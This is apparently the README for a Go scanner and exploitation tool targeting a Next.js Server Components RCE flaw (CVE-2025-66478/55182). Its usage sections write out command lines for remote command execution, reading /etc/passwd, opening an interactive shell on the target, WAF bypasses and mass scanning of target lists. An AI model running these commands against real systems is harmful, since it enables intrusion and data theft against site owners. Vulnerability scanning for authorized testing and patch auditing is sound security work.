# React2Shell Ultimate - CVE-2025-66478 Scanner (Go Implementation)

A high-performance Go implementation of the Next.js RSC (React Server Components) RCE vulnerability scanner for CVE-2025-66478 and CVE-2025-55182.

## Features

- **High Concurrency**: Leverages Go's goroutines for parallel scanning (default: 100 workers, max: 500)
- **Multiple Scan Modes**: Version detection, safe side-channel, RCE PoC, and comprehensive scanning
- **WAF Bypass Techniques**: Junk data injection, Unicode encoding, and Vercel-specific bypasses
- **Local Project Scanning**: Scan local Next.js projects for vulnerable versions
- **Interactive Shell**: God mode for authorized red team assessments
- **Clean Architecture**: SOLID principles with modular design patterns
- **Zero Dependencies**: Uses only Go standard library (except optional cobra for CLI)

## Installation

### From Source

```bash
git clone <repository-url>
cd react2shell-go
go build ./cmd/scanner
```

### Pre-built Binaries

Download the appropriate binary for your platform from the releases page:

- `scanner-linux-amd64` - Linux (64-bit)
- `scanner-linux-arm64` - Linux (ARM64)
- `scanner-darwin-amd64` - macOS (Intel)
- `scanner-darwin-arm64` - macOS (Apple Silicon)
- `scanner-windows-amd64.exe` - Windows (64-bit)
- `scanner-windows-arm64.exe` - Windows (ARM64)

## Building for Multiple Platforms

### Linux/macOS

```bash
./build.sh
```

This will create binaries for all supported platforms in the `build/` directory.

### Windows

```cmd
build.bat
```

Or manually:

```bash
# Linux
GOOS=linux GOARCH=amd64 go build -o scanner-linux-amd64 ./cmd/scanner

# macOS (Intel)
GOOS=darwin GOARCH=amd64 go build -o scanner-darwin-amd64 ./cmd/scanner

# macOS (Apple Silicon)
GOOS=darwin GOARCH=arm64 go build -o scanner-darwin-arm64 ./cmd/scanner

# Windows
GOOS=windows GOARCH=amd64 go build -o scanner-windows-amd64.exe ./cmd/scanner
```

## Usage

### Quick Start

```bash
# Scan a single URL (comprehensive mode)
./scanner -u https://target.com

# Safe scan (no code execution)
./scanner -u https://target.com --safe

# RCE proof-of-concept
./scanner -u https://target.com --rce

# Version detection only (fastest)
./scanner -u https://target.com --version

# Scan multiple targets from file
./scanner -l targets.txt --workers 2000

# Scan local Next.js projects
./scanner --local /path/to/projects
```

### Scan Modes

- `--safe`: Safe side-channel detection (no code execution)
- `--rce`: RCE proof-of-concept (executes harmless calculation: 41*271=11111)
- `--version`: Version detection only via HTTP headers (fastest)
- `--comprehensive`: Full scan with all techniques (default)

### WAF Bypass Options

```bash
# Junk data bypass
./scanner -u https://target.com --rce --waf-bypass

# Custom junk data size (in KB)
./scanner -u https://target.com --rce --waf-bypass --waf-bypass-size 256

# Unicode encoding bypass
./scanner -u https://target.com --rce --unicode

# Vercel-specific bypass
./scanner -u https://target.com --rce --vercel-bypass
```

### God Mode (Authorized Red Team Only)

**⚠️ WARNING: God mode enables actual command execution. Only use on systems you have explicit written authorization to test.**

```bash
# Execute a single command
./scanner --god -u https://target.com --cmd 'id'

# Read a file
./scanner --god -u https://target.com --read-file '/etc/passwd'

# Interactive shell
./scanner --god -u https://target.com --shell

# With WAF bypass
./scanner --god -u https://target.com --cmd 'ls -la' --waf-bypass

# Windows PowerShell commands
./scanner --god -u https://target.com --cmd 'whoami' --windows
```

### Network Options

```bash
# Custom timeout (seconds)
./scanner -u https://target.com --timeout 30

# Custom worker count (default: 100, max: 500)
./scanner -l targets.txt --workers 200

# Disable SSL verification (default: enabled)
./scanner -u https://target.com --k

# Use proxy
./scanner -u https://target.com --proxy http://proxy:8080
```

### Output Options

```bash
# JSON output
./scanner -u https://target.com --json

# Save results to file
./scanner -l targets.txt -o results.json

# Save all results (not just vulnerable)
./scanner -l targets.txt -o results.json --all-results

# Verbose output
./scanner -u https://target.com --v

# Quiet mode (only show vulnerable)
./scanner -l targets.txt --q

# Disable colored output
./scanner -u https://target.com --no-color
```

## Architecture

The project follows SOLID principles and clean architecture:

```
react2shell-go/
├── cmd/scanner/          # CLI entry point
├── internal/
│   ├── scanner/          # Core scanning logic
│   ├── payload/           # Payload builders
│   ├── waf/             # WAF bypass strategies
│   ├── client/          # HTTP client abstraction
│   ├── local/           # Local project scanning
│   ├── output/          # Output formatters
│   └── shell/           # Interactive shell
└── pkg/
    ├── models/          # Data models
    └── utils/           # Utility functions
```

### Design Patterns

- **Strategy Pattern**: WAF bypass strategies
- **Builder Pattern**: Payload construction
- **Worker Pool Pattern**: Concurrent scanning
- **Factory Pattern**: Scanner creation
- **Command Pattern**: Interactive shell commands

## Performance

The Go implementation provides significant performance improvements:

- **Default Concurrency**: 100 workers (configurable, max: 500)
- **Connection Pooling**: Reuses HTTP connections efficiently
- **Zero-copy Operations**: Minimizes memory allocations
- **Context-based Cancellation**: Graceful timeout handling
- **Per-host Rate Limiting**: Prevents overwhelming targets

### Benchmarking

For large-scale scans, the Go implementation can handle:
- 10,000+ URLs in minutes
- 1000+ concurrent requests
- Efficient memory usage with connection pooling

## Vulnerability Details

### CVE-2025-66478 / CVE-2025-55182

Affects Next.js versions:
- **15.x**: Vulnerable except patched versions (15.0.5+, 15.1.9+, 15.2.6+, 15.3.6+, 15.4.8+, 15.5.7+)
- **16.0.0 - 16.0.6**: Vulnerable
- **16.0.7+**: Patched
- **14.x canary**: Some versions vulnerable

## Examples

### Example 1: Quick Vulnerability Check

```bash
./scanner -u https://example.com --version
```

### Example 2: Comprehensive Scan with WAF Bypass

```bash
./scanner -u https://example.com --comprehensive --waf-bypass --workers 2000
```

### Example 3: Batch Scanning

```bash
# Create targets.txt with one URL per line
echo "https://target1.com" > targets.txt
echo "https://target2.com" >> targets.txt

# Scan all targets
./scanner -l targets.txt --workers 2000 -o results.json
```

### Example 4: Local Project Audit

```bash
./scanner --local /path/to/nextjs/projects --all-results -o audit.json
```

## Error Handling

The scanner handles various error conditions gracefully:

- **Network Errors**: Timeouts, connection failures
- **WAF Detection**: Automatically detected and reported
- **Invalid URLs**: Normalized and validated
- **SSL Errors**: Configurable verification

## Security Considerations

1. **Authorization Required**: Only use on systems you have explicit written permission to test
2. **Legal Compliance**: Unauthorized access is illegal (CFAA, CMA, etc.)
3. **Responsible Disclosure**: Report vulnerabilities through proper channels
4. **Data Handling**: Be cautious with sensitive data in scan results

## Troubleshooting

### Build Issues

```bash
# Ensure Go 1.21+ is installed
go version

# Clean and rebuild
go clean -cache
go build ./cmd/scanner
```

### Runtime Issues

```bash
# Increase timeout for slow targets
./scanner -u https://target.com --timeout 30

# Reduce workers if hitting rate limits
./scanner -l targets.txt --workers 500

# Enable verbose output for debugging
./scanner -u https://target.com --v
```

## Contributing

Contributions are welcome! Please follow these guidelines:

1. Follow Go best practices and idioms
2. Maintain SOLID principles
3. Add tests for new features
4. Update documentation
5. Keep code clean and readable

## License

See LICENSE file for details.

## Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

This tool is intended for authorized security testing only. Unauthorized access to computer systems is illegal and may result in criminal prosecution. The authors and contributors are not responsible for any misuse of this tool.

## Credits

- **Go Implementation**: Adedamola Adeyemo (@megactek) - https://github.com/megactek
- **Original Python Implementation**: Satyam Rastogi (@hackersatyamrastogi) - https://github.com/hackersatyamrastogi
- **Research Credits**: Based on research from Assetnote, Malayke, Pyroxenites, and Abtonc

## Support

For issues, questions, or contributions, please open an issue on the repository.

---

**Version**: 1.1.0  
**Go Implementation**: Adedamola Adeyemo (@megactek) - https://github.com/megactek  
**Original Author**: Satyam Rastogi (@hackersatyamrastogi) - https://github.com/hackersatyamrastogi

